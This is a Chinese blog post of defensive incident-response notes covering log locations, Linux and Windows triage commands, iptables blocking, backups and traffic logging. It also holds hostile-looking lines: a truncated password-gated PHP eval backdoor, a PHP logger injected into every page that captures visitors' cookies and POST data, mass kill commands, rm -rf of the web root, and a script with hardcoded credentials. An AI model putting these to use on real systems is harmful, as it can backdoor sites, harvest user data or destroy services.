---
title: 'SRC 应急响应知识点总结'
description: 'systeminfo'
pubDate: 2025-01-10
author: 'IHK-1'
tags: ['SRC', '应急响应', '安全运维', '知识总结']
---

## 漏洞研判溯源 && 响应策略
<!-- 这是一张图片，ocr 内容为：弱口令 扫描后门 代码审计 防守 部署WAF 流量监控 -->


```plain
防御：
  修改弱口令 && mysql本地查询  find / | xargs grep "mysqli("  mysql_connect(
  上传waf && 流量监控 && 日志监控  find / -name *access.log*
  IP禁止
  文件夹权限修改
  查看进程

  <?php if(md5($_GET['pass'])==='hash'){eval...}
```

# 应急响应日志
## 1.linux 日志
```plain
重点日志文件“/var/log/btmp”、“/var/log/lastlog”、“/var/log/wtmp”、“/var/log/btmp”、“/var/log/secure”以及软件安装日志。

1./var/log/btmp
  使用w、who、users命令进行查看。

2./var/log/lastlog
  显示最后一次登陆成功的用户，使用lastlog命令查看。

3./var/log/wtmp
  永久记录每个用户登录、注销以及系统启动、停机的事件。使用命令last查看。

4./var/log/btmp
  记录Linux登陆失败用户、时间以及远程IP地址。使用命令lastb查看

5./var/log/secure
  记录用户登录认证的相关日志，包括修改用户名密码等。

6.软件安装日志
  “/var/log/yum.log"或”/var/log/yum.log-时间"中会显示yum安装的日志。

alternatives.log	系统的一些更新替代信息记录
apport.log	应用程序崩溃信息记录
apt/history.log	使用 apt-get 安装卸载软件的信息记录
apt/term.log	使用 apt-get 时的具体操作，如 package 的下载、打开等
auth.log	登录认证的信息记录
boot.log	系统启动时的程序服务的日志信息
btmp	错误的信息记录
Consolekit/history	控制台的信息记录
dist-upgrade	dist-upgrade 这种更新方式的信息记录
dmesg	启动时，显示屏幕上内核缓冲信息，与硬件有关的信息
dpkg.log dpkg	命令管理包的日志。
faillog	用户登录失败详细信息记录
fontconfig.log	与字体配置有关的信息记录
kern.log	内核产生的信息记录，在自己修改内核时有很大帮助
lastlog	用户的最近信息记录
wtmp	登录信息的记录。wtmp 可以找出谁正在进入系统，谁使用命令显示这个文件或信息等
syslog	系统信息记录
```

## 2.windows 日志
```plain
1.查看日志
  开始 -> 运行 -> eventvwr

2.Windows日志
  %SystemRoot%\System32\Winevt\Logs\System.evtx

3.应用程序
  %SystemRoot%\System32\Winevt\Logs\Application.evtx

4.转发事件
  %SystemRoot%\System32\Winevt\Logs\ForwardedEvents.evtx
```

## 3.MySQL 日志
```plain
1）MySQL日志在Windows系统中，MySQL的默认配置路径为
C:\Windows\my.ini、C:\Windows\mysql\my.ini
在Linux系统中，MySQL的默认配置路径为/etc/mysql/my.cnf。查看是否开启日志审计，若开启，则将显示日志路径。
```

<!-- 这是一张图片，ocr 内容为： -->


```plain
1.status 查看当前数据库状态

2.ErrorLog
  记录Mysql运行过程中的Error、Warning、Note等信息，系统出错或者某条记录出问题可以查看Error日志；

3.GenaralQuery Log
  记录mysql的日常日志，包括查询、修改、更新等的每条sql；

4.Binary Log
  二进制日志，包含一些事件，这些事件描述了数据库的改动，如建表、数据改动等，主要用于备份恢复、回滚操作等；

5.Slow QueryLog*
  记录Mysql 慢查询的日志

6.general_log_file 查看日志保存位置
```

## redis 日志
```plain
vim /etc/redis/redis.conf
logfile /var/log/redis/redis-server.log

```

## 4.sql server 日志
```plain
1.sql sever日志
  1.右键单击“SQL Server 日志”，指向“查看” ，然后单击“SQL Server 日志” 或“SQLServer 和 Windows 日志” 。
  2.展开“SQL Server 日志” ，右键单击任何日志文件，然后单击“查看 SQL Server 日志” 。 
```

## 5.weblogic 日志
```plain
# 日志路径
  1.WebLogic 9及以后版本：
    access log在$MW_HOME\user_projects\domains\\servers\\logs\access.log
    server log在$MW_HOME\user_projects\domains\\servers\\logs\.log
    domain log在 $MW_HOME\user_projects\domains\\servers\\logs\.log
  
  2.WebLogic 8.x版本：
    access log路径如下：$MW_HOME\user_projects\domains\\\access.log
    server log路径如下：$MW_HOME\user_projects\domains\\\.log
    domain log路径如下： $MW_HOME\user_projects\domains\\.log

# 日志作用
  1.access.log
    主要记录http请求，默认情况下日志记录处于启用状态，服务器将http请求保存在单独的日志文件中，日志格式如下，主要记录了http请求请求ip地址、请求时间、访问页面、响应状态等信息

  2.server log
    主要用于服务器的一般日志记录，比如weblogic的启动、关闭、部署应用等相关记录，日志格式：依次为时间戳，严重程度，子系统，计算机名，服务器名，线程ID

  3.domain log
    主要记录了一个domain的运行情况，一个domain中的各个weblogic server 可以把它们的一些信息（如：严重错误）发送到AdminServer上，AdminServer把这些信息传递到domain.log上
```

## 6.tomcat 日志
```plain
# 日志路径
  安装目录下的logs文件夹
  如果在安装中默认修改了日志存储位置，可在 conf/logging.properties文件中查看

# 日志作用
  1.catalina.out
    运行中的日志，主要记录运行中产生的一些信息，尤其是一些异常错误日志信息

  2.catalina.Y-M-D.log
    是tomcat自己运行的一些日志，这些日志还会输出到catalina.out，
    但是应用向console输出的日志不会输出到catalina.{yyyy-MM-dd}.log

  3.localhost.Y-M-D.log
    程序异常没有被捕获的时候抛出的地方，
    Tomcat下内部代码丢出的日志（jsp页面内部错误的异常，org.apache.jasper.runtime.HttpJspBase.service类丢出的，日志信息就在该文件！）
    应用初始化(listener,filter, servlet)未处理的异常最后被tomcat捕获而输出的日志，而这些未处理异常最终会导致应用无法启动。

  4.manager.Y-M-D.log
    管理日志

  5.localhost_access_log
    主要记录访问日志信息，记录访问的的时间、ip地址等信息，也是应急中经常用到的日志信息
    此部分日志可通过查看server.xml文件的如下内容，来确定是否启用了访问日志记录
```

## 7.apache 日志
```plain
# 日志路径
  1.access_log
    /var/log/apache2/access.log
    grep -i "CustomLog" /etc/httpd/conf/httpd.conf
    
  2.error_log
    grep -i "ErrorLog" /etc/httpd/conf/httpd.conf

# 日志作用
  1.access_log
    访问日志,记录所有对apache服务器进行请求的访问
    
  2.error_log
    错误日志,记录下任何错误的处理请求，通常服务器出现什么错误，可对该日志进行查看
```

## 8.nginx 日志
```plain
# 日志目录
  nginx的日志主要分为access.log、error.log两种，可通过查看nginx.conf文件来查找相关日志路径

# 日志作用 
  /var/log/nginx.log
  1.access.log
    主要记录访问日志，记录访问客户端ip地址、访问时间、访问页面等信息

  2.error.log
    主要记录一些错误信息
```

## 9.IIS 日志
```plain
# 日志路径
  属性中查看
```

# linux应急响应
## 1.查看用户信息
```plain
1.查看特权用户
  cat /etc/passwd  # 查看用户信息文件
  cat /etc/shadow  # 查看影子文件

  awk -F: '$3==0{print $1}' /etc/passwd
  cat /etc/passwd | grep x:0  # # 查看系统是否还存在其他的特权账户，uid为0，默认系统只存在root一个特权账户

who 查看当前登录用户（tty本地登陆 pts远程登录）
w 查看系统信息，想知道某一时刻用户的行为
last 列出所有用户登陆信息
lastb 列出所有用户登陆失败的信息
lastlog 列出所有用户最近一次登录信息

2.查看当前登入用户，以及ip
  who

3.查看当前登入用户，以及其执行程序
  w

4.查看现在的开机时间、系统时长、目前登入的用户
  uptime

5.查看密码文件修改时间
  stat /etc/passwd

6.查看除了不可登录以外的用户都有哪些，有没有新增的
  cat /etc/passwd | grep -v nologin

7.查看能使用bash shell登录的用户
  cat /etc/passwd | grep /bin/bash

8.tty 查看连接设备
9.pkill -kill -t <用户tty>
```

## 2.历史命令
```plain
1.查看历史命令
  history

2.保留历史命令
  cat .bash_history >> history.txt
```

## 3.网络 && 连接
```plain
1.查看端口开放和连接情况
  netstat -pantu

2.lsof 查看端口进程
	lsof -i:port

2.发现可疑IP，即可根据对应PID查找到其路径
  ls -l /proc/pid/exe

4. arp
	显示了 IP 到物理地址的转换表

3.host 封杀ip
  1.使用hosts.allow和hosts.deny来设置ip白名单和黑名单，/etc/目录下.
    复制代码

    优先级为先检查hosts.deny，再检查hosts.allow，   
    后者设定可越过前者限制，   
    例如：   
      1.限制所有的ssh，   
        除非从216.64.87.0 - 127上来。   
        hosts.deny:   
        in.sshd:ALL   
        hosts.allow:   
        in.sshd:216.64.87.0/255.255.255.128  
   
      2.封掉216.64.87.0 - 127的telnet   
        hosts.deny   
        in.sshd:216.64.87.0/255.255.255.128  
   
      3.限制所有人的TCP连接，除非从216.64.87.0 - 127访问   
        hosts.deny   
        ALL:ALL   
        hosts.allow   
        ALL:216.64.87.0/255.255.255.128  
   
      4.限制216.64.87.0 - 127对所有服务的访问   
        hosts.deny   
        ALL:216.64.87.0/255.255.255.128  
   
      # 其中冒号前面是TCP daemon的服务进程名称，通常系统   
      # 进程在/etc/inetd.conf中指定，比如in.ftpd，in.telnetd，in.sshd   
      # 其中IP地址范围的写法有若干中，主要的三种是：   
        1.网络地址--子网掩码方式：   
          216.64.87.0/255.255.255.0  
        2.网络地址方式（我自己这样叫，呵呵）   
          216.64.（即以216.64打头的IP地址）   
        3.缩略子网掩码方式，既数一数二进制子网掩码前面有多少个“1”比如：   
          216.64.87.0/255.255.255.0 -- 216.64.87.0/24  
   
      设置好后，要重新启动  
      # /etc/rc.d/init.d/xinetd restart  
      # /etc/rc.d/init.d/network restart

4.使用iptables命令

  单个IP的命令是  
    iptables -I INPUT -s 81.241.219.171 -j DROP  
   
  封IP段的命令是  
    iptables -I INPUT -s 97.47.225.0/16 -j DROP  
    iptables -I INPUT -s 97.47.225.0/16 -j DROP  
    iptables -I INPUT -s 97.47.225.0/16 -j DROP  
   
  封整个段的命令是  
    iptables -I INPUT -s 97.47.225.0/8 -j DROP  
   
  封几个段的命令是  
    iptables -I INPUT -s 97.47.225.0/24 -j DROP  
    iptables -I INPUT -s 97.47.225.0/24 -j DROP   

  服务器启动自运行，有三个方法：  
    1、把它加到/etc/rc.local中  
    2、vi /etc/sysconfig/iptables可以把你当前的iptables规则放到/etc/sysconfig/iptables中，系统启动iptables时自动执行。  
    3、service   iptables   save 也可以把你当前的iptables规则放/etc/sysconfig/iptables中，系统启动iptables时自动执行。  
    后两种更好些，一般iptables服务会在network服务之前启来，更安全  
   
  解封：  
    iptables -L INPUT  
    iptables -L --line-numbers 然后iptables -D INPUT 序号   
   
   
  iptables 限制ip访问  
    通过iptables限制9889端口的访问（只允许192.168.1.100、192.168.1.101、192.168.1.102）,其他ip都禁止访问  
    iptables -I INPUT -p tcp --dport 9889 -j DROP  
    iptables -I INPUT -s 192.168.1.100 -p tcp --dport 9889 -j ACCEPT  
    iptables -I INPUT -s 192.168.1.101 -p tcp --dport 9889 -j ACCEPT  
    iptables -I INPUT -s 192.168.1.102 -p tcp --dport 9889 -j ACCEPT
```

## 4.进程
```plain
1.查看进程
  ps -aux

2.查看关联进程
  ps -aux | grep pid

3.查看cpu占用前10的进程
  ps aux --sort=pcpu | head -10
```

## 5.自启项
```plain
1.查看开机启动项
  systemctl list-unit-files | grep enabled
```

## 6.定时任务
```plain
1.查看定时任务
  crontab -l

2.查看指定用户定时任务
  crontab -u root -l
```

## 7.进程监控
```plain
1.进程动态监控
  top

2.监控指定程序
  top -p pid

3.监控所有进程
  ps -ef / ps -aux

4.kill 进程查杀
  kill PID：终止进程
  kill -9 pid：立即终止进程
  kill -0 pid：判断进程id是否存在，终止进程
  killall：根据名称终止进程
  pkill：根据名字终止所有进程

  www-data查杀
  <?php
    system("kill `ps -aux | grep www-data | grep apache2 | awk '{print $2}'`");
  ?>

  kill -9 $(netstat -nlp | grep :8080 | awk '{print $7}' | awk -F"/" '{ print $1 }')  # 关闭指定端口
  kill -9 $(netstat -anopt | grep -v "sshd\|httpd\|mysqld" | awk '{print $7}' | awk -F"/" '{ print $1 }')  # 关闭之外的端口
```

## 8.host文件
```plain
cat /etc/host 查看host文件是否被更改
```

## 9.日志
```plain
1.日志
  cat /var/log/secure
  cat /var/log/auth.log

2.统计爆破主机root账号的失败次数以及IP
  cat /var/log/auth.log.1 | grep -a "Failed password for root" | awk '{print $11}' | sort | uniq -c | sort -nr | more

3.查看成功登录的日期、用户名、IP
  cat /var/log/auth.log.1 | grep -a "Accepted password for root" | awk '{print $11}' | sort | uniq -c | sort -nr | more

4.查看爆破的字典
  root@ip-10-0-10-1:~# cat /var/log/auth.log.1 | grep -a "Failed password" | perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'| uniq -c | sort -nr
      5  invalid user user
      5  invalid user hello
      5  invalid user 
      4  root
      1  root
      1  root
      1  invalid user test3
      1  invalid user test2
      1  invalid user test1
```

## 10.命令状态
```plain
1.查看命令修改时间
  stat /bin/netstat
```

## 11.备份与还原
```plain
# tar备份打包：
  cd /var/www/html
  tar -zcvf ~/html.tar.gz *
  
# tar备份解压：
  rm -rf /var/www/html
  tar -zxvf ~/html.tar.gz -C /var/www/html

# sql数据库备份
  $ cd /var/lib/mysql #(进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
  $ mysqldump -u root -p Test > Test.sql # 输入密码即可。
  $ mysqldump -u root -p --all-databases > ~/backup.sql  # 备份所有数据库
  $ mysqldump -u root -p --all-databases -skip-lock-tables > ~/backup.sql  # 跳过锁定的数据库表

# sql数据库还原
  $ mysql -u root -p
  mysql> create database [database_name];  # 输入要还原的数据库名
  mysql> use [database_name]
  mysql> source backup.sql;    # source后跟备份的文件名Copy
```

## 12.口令修改
```plain
# sql 登入
  mysql -h 127.0.0.1 -u cms -p

# 更新数据库密码
  UPDATE users SET password = 'newpassword' WHERE id = 1;

# sql 数据库口令修改
    $ mysql -u root -p
    show databases;
    use mysql
    set password for root@localhost = password('123');
  或者
    update user set password = PASSWORD('需要更换的密码') where user='root';
    update user set password = PASSWORD('1') where user='root';
    flush privileges;
    show tables;   # 看看有没有flag

# SSH 口令修改
    SSH登录 -> passwd [user]

# CMS 弱口令
    直接在CMS中修改

```

## 11.恶意代码检测 及 linux过滤
```plain
# find / -type f -name "*.php" -print | xargs grep -l 'eval('
# find
  -name：按文件名查找 模糊匹配?与*
  -type：按文件类型查找 f 文件 d 目录 l 链接符号
  -size -size [+-size][c w b k m g]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）
  -user username：按文件所有者查找
  -group groupname：按文件所属组查找

# xargs 过滤器 将 find 的输出结果作为参数传递给 grep

# grep 读取文件内容过滤
  -i：忽略大小写进行匹配。
  -v：反向查找，只打印不匹配的行。
  -n：显示匹配行的行号。
  -r：递归查找子目录中的文件。
  -l：只打印匹配的文件名。
  -c：只打印匹配的行数。

# cat access.log.1 | grep "03/Aug/2023:08:" | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10
# awk
  -F 'split'：使用指定字符分割
  '{print $1"/"$2}'：打印指定字串，并输出

# sort 按照首字母排序
  -n 依照数值大小排序

# uniq
  -u或–unique：仅显示出一次的行列。
  -c或–count：在每列旁边显示该行重复出现的次数。
  -d或–repeated：仅显示重复出现的行列。
  -f<栏位>或–skip-fields=<栏位>：忽略比较指定的栏位。
  -s<字符位置>或–skip-chars=<字符位置>：忽略比较指定的字符。
  -w<字符位置>或–check-chars=<字符位置>：指定要比较的字符。

# cat access.log.1 | grep "/index.php" | wc -l
# wc
  -c或--bytes或--chars：只显示Bytes数。
  -l或--lines：显示行数。
  -w或--words：只显示字数。
```

## 12.文件监控
```plain
# python
# -*- encoding: utf-8 -*-
'''
监听还原脚本‐>5分钟还原一次
@File    :   awd.py
@Time    :   2020/08/09 20:44:54
@Author  :   iloveflag 
@Version :   1.0
@Contact :   iloveflag@outlook.com
@Desc    :  The Win32 port can only create tar archives,
            but cannot pipe its output to other programs such as gzip or compress, 
            and will not create tar.gz archives; you will have to use or simulate a batch pipe.
            BsdTar does have the ability to direcly create and manipulate .tar, .tar.gz, tar.bz2, .zip,
            .gz and .bz2 archives, understands the most-used options of GNU Tar, and is also much faster;
            for most purposes it is to be preferred to GNU Tar. 
'''

import paramiko
import os
import time

def web_server_command(command,transport): #对服务器执行命令
    ssh = paramiko.SSHClient()
    ssh._transport = transport
    stdin, stdout, stderr = ssh.exec_command(command)
    # print(stdout.read())


def web_server_file_action(ip, port, user, passwd, action): #对服务器文件操作
    try:
        transport = paramiko.Transport(ip, int(port))
        transport.connect(username=user, password=passwd)
        sftp = paramiko.SFTP.from_transport(transport)
        remote_path='/var/www/html/'
        remote_file = 'html.tar'
        local_path = 'C:/Users/'+os.getlogin()+'/Desktop/awd/'+ip+'/'
        web_server_command('cd '+remote_path+' && tar -cvf '+remote_file+' ./',transport)
        if not(os.path.exists(local_path)):
            os.makedirs(local_path)
        if action == 'get':
            sftp.get(remote_path+remote_file,local_path+remote_file)
            web_server_command('rm -rf '+remote_path+remote_file,transport)
            print('服务器源码保存在'+local_path)
            print('正在解压:')
            os.system('cd '+local_path+' & tar -xvf '+remote_file+' &del '+remote_file)
            print('文件解压完成')
        else:
            web_server_command('rm -rf '+remote_path+'*',transport)
            print('清理服务器web目录')
            os.system('cd '+local_path+' & tar -cvf '+remote_file+' ./*')
            sftp.put(local_path+remote_file, remote_path+remote_file)
            print('上传成功')
            web_server_command('cd '+remote_path+'&& tar -xvf '+remote_file+' && rm -rf '+remote_file,transport)
            print('还原完毕')
            print('-----------------------------')
        sftp.close()
    except:
        pass
        print('download or upload error')


def web_server_mysql_action():
    #web_server_mysql_action
    pass
def web_server_status():
    #web_server_status
    pass
if __name__ == '__main__':
    web1_server_ip='10.241.180.159'
    web1_server_port='30021'
    web1_server_user='ctf'
    web1_server_passwd='123456'
    while(1):       
        for i in range(5,0,-1):
            time.sleep(1)
            print('倒计时'+str(i)+'秒')
        web_server_file_action(web1_server_ip,web1_server_port,web1_server_user,web1_server_passwd, 'put')
```

```plain
# SCP
scp -P 30022 -r -q web ctf@10.241.180.159:/var/www/html

# 按照提示输入密码即可
scp [可选参数] file_source file_target 
-P 指定传输到服务器的端口，默认为22
-r 递归传输整个web文件夹
-q 不显示传输进度条
```

## 13文件全选 chmod 修改
```plain
chmod:
  -r 文件所有者
  -g 用户组
  -o 其他用户

  r w x 读取，写入，执行

example:
  chmod -r=--- -g=rwx -o=r-- 等效于chmod 000,111,100 等效于chmod 074
```

## 14.流量监控
### 1.PHP流量监控
```plain
# PHP
# 部署时 入口头部文件包含即可 require_once()
# find /var/www/html/test1 -type f -path "*.php" | xargs sed -i "s/<?php /<?php\nrequire_once('\/var\/www\/html\/waf2.php');\n/g"
# find /var/www/html/test1 -type f -name '*.php' -exec sed -i '1i<?php require_once("/tmp/log.php");?>' {} \;
# find /var/www/html/ -path /var/www/html/lib -prune -o -type f -name '*.php' -exec sed -i '1i<?php require_once("/tmp/log.php");?>' {} \;
# 意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。

<?php
$ip = $_SERVER["REMOTE_ADDR"];      //记录访问者的ip
$filename = $_SERVER['PHP_SELF'];       //访问者要访问的文件名
$parameter = $_SERVER["QUERY_STRING"];      //访问者要请求的参数
$method = $_SERVER['REQUEST_METHOD'];       //请求方法
$uri = $_SERVER['REQUEST_URI'];             //请求URI
$time = date('Y-m-d H:i:s',time());     //访问时间
$post = file_get_contents("php://input",'r');       //接收POST数据
$others = '...其他你想得到的信息...';
$logadd = 'Visit Time：'.$time.' '.'Visit IP：'.$ip."\r\n".'RequestURI：'.$uri.' '.$parameter.'RequestMethod：'.$method."\r\n";
// log记录
$fh = fopen("/tmp/log.txt", "a+");
fwrite($fh, $logadd);
fwrite($fh, print_r($_COOKIE, true)."\r\n");
fwrite($fh, $post."\r\n");
fwrite($fh, $others."\r\n");
fclose($fh);
?>

```

```plain
# PHP
<?php

date_default_timezone_set('Asia/Shanghai');
$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip
$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名
$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数
$time = date('Y-m-d H:i:s',time()); //访问时间
$logadd = '来访时间：'.$time.'-->'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";

// log记录
$fh = fopen("log.txt", "a");
fwrite($fh, $logadd);
fclose($fh);

?>
```

### 2.weblogger
```plain
# weblogger
# 部署
  chmod -R weblogger/
  open http://xxxxxxxx/weblogger/install.php in Web browser
  install it
```

### 3.watchbird
```plain
# watchbird
  php watchbird.php --install [Web目录]
  例如:php watchbird.php --install /var/www/html

  需要卸载的话
  php watchbird.php --uninstall [Web目录]
```

### 4.tcpdump流量监控
##### 1.安装部署
```plain
# 安装libpcap
tar xvfz libpcap-1.10.4.tar.xz
cd libpcap-1.10.4
./configure
make
make install

# 安装tcpdump
tcpdump-4.99.4.tar.xz
cd tcpdump-4.99.4
./configure
make
make install
```

##### 2.命令
```plain
# 命令：
  -A 以ASCII格式打印出所有分组，并将链路层的头最小化。
  -c 在收到指定的数量的分组后，tcpdump就会停止。
  -C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size
  中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size
  的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。
  -d 将匹配信息包的代码以人们能够理解的汇编格式给出。
  -dd 将匹配信息包的代码以c语言程序段的格式给出。
  -ddd 将匹配信息包的代码以十进制的形式给出。
  -D 打印出系统中所有可以用tcpdump截包的网络接口。
  -e 在输出行打印出数据链路层的头部信息。
  -E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。
  -f 将外部的Internet地址以数字的形式打印出来。
  -F 从指定的文件中读取表达式，忽略命令行中给出的表达式。
  -i 指定监听的网络接口。
  -l 使标准输出变为缓冲行形式。
  -L 列出网络接口的已知数据链路。
  -m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。
  -M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。
  -n 不把网络地址转换成名字。
  -N 不输出主机名中的域名部分。例如，link.linux265.com 只输出link。
  -t 在输出的每一行不打印时间戳。
  -O 不运行分组分组匹配（packet-matching）代码优化程序。
  -P 不将网络接口设置成混杂模式。
  -q 快速输出。只输出较少的协议信息。
  -r 从指定的文件中读取包(这些包一般通过-w选项产生)。
  -S 将tcp的序列号以绝对值形式输出，而不是相对值。
  -s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。
  -T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。
  -t 不在每一行中输出时间戳。
  -tt 在每一行中输出非格式化的时间戳。
  -ttt 输出本行和前面一行之间的时间差。
  -tttt 在每一行中输出由date处理的默认格式的时间戳。
  -u 输出未解码的NFS句柄。
  -v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。
  -vv 输出详细的报文信息。
  -w 直接将分组写入文件中，而不是不分析并打印出来。
  -x 以16进制数形式显示每一个报文 (去掉链路层报头) . 可以显示较小的完整报文, 否则只显示snaplen个字节.
  -xx 以16进制数形式显示每一个报文（包含链路层包头）。
  -X 以16进制和ASCII码形式显示每个报文（去掉链路层报头）。
  -XX 以16进制和ASCII吗形式显示每个报文（包含链路层报头）。
  -y 设置tcpdump 捕获数据链路层协议类型
  -Z 使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的用户ID设置为user, 组ID设置为user首要所属组的ID
```

##### 3.常用命令
```plain
# 常用指令
  01、抓取所有网络包，并在terminal中显示抓取的结果，将包以十六进制的形式显示。
    tcpdump

  02、抓取所有的网络包，并存到 result.cap 文件中。
    tcpdump -w result.cap
    tcpdump -w result.cap &> /dev/null &  # 静默运行

  03、抓取所有的经过eth0网卡的网络包，并存到result.cap 文件中。
    tcpdump -i eth0 -w result.cap

  04、抓取源地址是192.168.1.100的包，并将结果保存到 result.cap 文件中。
    tcpdump src host 192.168.1.100 -w result.cap

  05、抓取地址包含是192.168.1.100的包，并将结果保存到 result.cap 文件中。
    tcpdump host 192.168.1.100 -w result.cap

  06、抓取目的地址包含是192.168.1.100的包，并将结果保存到 result.cap 文件中。
    tcpdump dest host 192.168.1.100 -w result.cap

  07、抓取主机地址为 192.168.1.100 的数据包
    tcpdump -i eth0 -vnn host 192.168.1.100

  08、抓取包含192.168.1.0/24网段的数据包
    tcpdump -i eth0 -vnn net 192.168.1.0/24

  09、抓取网卡eth0上所有包含端口22的数据包
    tcpdump -i eth0 -vnn port 22

  10、抓取指定协议格式的数据包，协议格式可以是「udp,icmp,arp,ip」中的任何一种,例如以下命令：
    tcpdump udp  -i eth0 -vnn

  11、抓取经过 eth0 网卡的源 ip 是 192.168.1.100 数据包，src参数表示源。
    tcpdump -i eth0 -vnn src host 192.168.1.100

  12、抓取经过 eth0 网卡目的 ip 是 192.168.1.100 数据包，dst参数表示目的。
    tcpdump -i eth0 -vnn dst host 192.168.1.100

  13、抓取源端口是22的数据包
    tcpdump -i eth0 -vnn src port 22

  14、抓取源ip是 192.168.1.100 且目的ip端口是22的数据包
    tcpdump -i eth0 -vnn src host 192.168.1.100 and dst port 22

  15、抓取源ip``192.168.1.100``22
    tcpdump -i eth0 -vnn src host 192.168.1.100 or port 22

  16、抓取源ip``192.168.1.100``22
    tcpdump -i eth0 -vnn src host 192.168.1.100 and not port 22

  17、抓取源ip是192.168.1.100且目的端口是22，或源ip是192.168.1.102且目的端口是80的数据包。
    tcpdump -i eth0 -vnn ( src host 192.168.1.100 and dst port 22 ) or ( src host 192.168.1.102 and dst port 80 )

  18、把抓取的数据包记录存到/tmp/result文件中，当抓取100个数据包后就退出程序。
    tcpdump –i eth0 -vnn -w /tmp/result -c 100

  19、从/tmp/result记录中读取tcp协议的数据包
    tcpdump -i eth0  tcp  -vnn -r /tmp/result

  20、想要截获所有192.168.1.100的主机收到的和发出的所有的数据包：
    tcpdump host 192.168.1.100

  21、如果想要获取主机192.168.1.100除了和主机192.168.1.101之外所有主机通信的ip包，使用命令：
    tcpdump ip host 192.168.1.100 and ! 192.168.1.101

  22、如果想要获取主机 192.168.1.100 接收或发出的 telnet 包，使用如下命令：
    tcpdump tcp port 23 host 192.168.1.100
```

# Windows 排查
## 系统信息
systeminfo

<!-- 这是一张图片，ocr 内容为：WINDOWS POWERSHELL COPYRIGHT (C) MICROSOFT CORPORATION. ALL RIGHTS RESERVED. PS C:\USERS\USER> SYSTEMINFO RED-WIN-ENUM HOST NAME: MICROSOFT WINDOWS SERVER 2019 DATACENTER OS NAME: 10.0.17763 N/A BUILD 17763 OS VERSION: OS MANUFACTURER: MICROSOFT CORPORATION OS CONFIGURATION: STANDALONE SERVER MULTIPROCESSOR FREE OS BUILD TYPE: EC2 REGISTERED OWNER: ORGANIZATION: AMAZON.COM REGISTERED PRODUCT ID: 00430-00000-00000-AA155 3/17/2021,  2:59:06 PM ORIGINAL INSTALL DATE: 5/12/2025,3:21:28 PM SYSTEM BOOT TIME: SYSTEM MANUFACTURER: AMAZON EC2 T3A.SMALL SYSTEM MODEL: X64-BASED PC SYSTEM TYPE: 1 PROCESSOR(S) INSTALLED. PROCESSOR(S): ~2200 MHZ [01]: AMD64 FAMILY 23 MODEL 1 STEPPING 2 AUTHENTICAMD BIOS VERSION: AMAZON EC2  1.0,10/16/2017 C:\WINDOWS DIRECTORY: WINDOWS SYSTEM DIRECTORY: C:\WINDOWS\SYSTEM32 \DEVICE\HARDDISKVOLUME1 BOOT DEVICE: EN-US;ENGLISH (UNITED STATES) SYSTEM LOCALE: EN-US;ENGLISH (UNITED STATES) INPUT LOCALE: (UTC) COORDINATED UNIVERSAL TIME TIME ZONE: 2,016 MB TOTAL PHYSICAL MEMORY: AVAILABLE PHYSICAL MEMORY:669 MB VIRTUAL MEMORY:MAX SIZE: 2,400  MB VIRTUAL MEMORY:AVAILABLE: 1,035 MB VIRTUAL MEMORY:IN USE: 1,365 MB PAGE FILE LOCATION(S): C:\PAGEFILE.SYS WORKGROUP DOMAIN: LARED-WIN-ENUM LOGON SERVER: 30 HOTFIX(S) INSTALLED. HOTFIX(S): [01]:KB5015731 [02]:KB4470502 [03]:KB4470788 [04]:KB4480056 [05]:KB4486153 [06]:KB4493510 -->


## windows 服务
1. 使用 net start 查看系统服务（net 命令是 net view，显示 windows 域信息）

<!-- 这是一张图片，ocr 内容为：PS C:\USERS\USER> NET START THESE WINDOWS SERVICES ARE STARTED: AMAZON SSM AGENT APP READINESS APPLICATION HOST HELPER SERVICE APPLICATION INFORMATION APPX DEPLOYMENT SERVICE (APPXSVC) BACKGROUND TASKS INFRASTRUCTURE SERVICE BASE FILTERING ENGINE CERTIFICATE PROPAGATION CLIENT LICENSE SERVICE (CLIPSVC) CNG KEY ISOLATION COM+EVENT SYSTEM COMPUTER BROWSER CONNECTED DEVICES PLATFORM SERVICE CONNECTED DEVICES PLATFORM USER SERVICE_71D33 COREMESSAGING CRYPTOGRAPHIC SERVICES DATA SHARING SERVICE DCOM SERVER PROCESS LAUNCHER DELIVERY OPTIMIZATION DEVICE SETUP MANAGER DHCP CLIENT DIAGNOSTIC POLICY SERVICE DIAGNOSTIC SYSTEM HOST DISTRIBUTED LINK TRACKING CLIENT DISTRIBUTED TRANSACTION COORDINATOR DNS CLIENT DNSSERVER FUNCTION DISCOVERY PROVIDER HOST FUNCTION DISCOVERY RESOURCE PUBLICATION GROUP POLICY CLIENT IP HELPER -->


2. net user 查看用户信息

<!-- 这是一张图片，ocr 内容为：PS C:\USERS\USER> NET USER RED-WIN-ENUM USER ACCOUNTS FOR ADMINISTRATOR DEFAULTACCOUNT GUEST JANE MICHAEL PETER STRATEGOS RANDA SSHD WDAGUTILITYACCOUNT USER THE COMMAND COMPLETED SUCCESSFULLY. -->


3. net localgroup administrators 查看管理组用户

